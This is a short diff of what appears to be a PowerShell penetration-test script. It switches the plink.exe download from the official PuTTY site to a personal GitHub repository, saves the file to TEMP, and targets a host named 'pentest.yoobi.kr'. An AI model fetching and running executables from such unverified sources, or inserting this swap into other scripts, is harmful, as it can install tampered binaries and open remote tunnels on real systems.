@@ -1,4 +1,4 @@
-$PlinkUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"
+$PlinkUrl = "https://github.com/sh3rlock93/testtest/raw/refs/heads/main/plink.exe"
 $PlinkPath = "$env:TEMP\plink.exe"
 
 $RemoteHost = "pentest.yoobi.kr"
